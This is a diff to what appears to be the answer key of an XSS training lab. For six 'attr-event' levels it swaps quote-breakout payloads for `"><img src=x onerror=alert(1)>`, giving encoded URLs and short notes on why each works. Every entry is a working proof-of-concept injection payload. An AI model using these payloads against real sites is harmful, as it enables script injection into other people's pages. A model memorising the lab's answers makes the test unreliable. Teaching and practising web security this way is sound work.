@@ -4,42 +4,42 @@ Reflections inside single-quoted JS strings within inline event handlers; close 
 
 ### attr-event-level1
 
-`/attr-event/level1/?query=%27);alert(1)//`
+`/attr-event/level1/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `');alert(1)//`
-- context: onmouseover="show('…')" — needs mouseover; close string + paren
+- payload: `"><img src=x onerror=alert(1)>`
+- context: double-quoted handler calling undefined show('…'), so a JS-string breakout throws first; close the attribute and tag instead
 
 ### attr-event-level2
 
-`/attr-event/level2/?query=%27);alert(1)//`
+`/attr-event/level2/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `');alert(1)//`
-- context: onsubmit="validate('…')" — fires on submit
+- payload: `"><img src=x onerror=alert(1)>`
+- context: double-quoted handler calling undefined validate('…'), so a JS-string breakout throws first; close the attribute and tag instead
 
 ### attr-event-level3
 
-`/attr-event/level3/?query=%27);alert(1)//`
+`/attr-event/level3/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `');alert(1)//`
-- context: body onload="init('…')" — fires on page load
+- payload: `"><img src=x onerror=alert(1)>`
+- context: double-quoted handler calling undefined init('…'), so a JS-string breakout throws first; close the attribute and tag instead
 
 ### attr-event-level4
 
-`/attr-event/level4/?query=%27);alert(1)//`
+`/attr-event/level4/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `');alert(1)//`
-- context: img onerror="report('…')" — fires automatically (broken src)
+- payload: `"><img src=x onerror=alert(1)>`
+- context: double-quoted handler calling undefined report('…'), so a JS-string breakout throws first; close the attribute and tag instead
 
 ### attr-event-level5
 
-`/attr-event/level5/?query=%27);alert(1)//`
+`/attr-event/level5/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `');alert(1)//`
-- context: input onblur="save('…')" — needs focus then blur
+- payload: `"><img src=x onerror=alert(1)>`
+- context: double-quoted handler calling undefined save('…'), so a JS-string breakout throws first; close the attribute and tag instead
 
 ### attr-event-level6
 
-`/attr-event/level6/?query=%27);alert(1)//`
+`/attr-event/level6/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `');alert(1)//`
-- context: button onclick="action('…')" — fires on click
+- payload: `"><img src=x onerror=alert(1)>`
+- context: double-quoted handler calling undefined action('…'), so a JS-string breakout throws first; close the attribute and tag instead
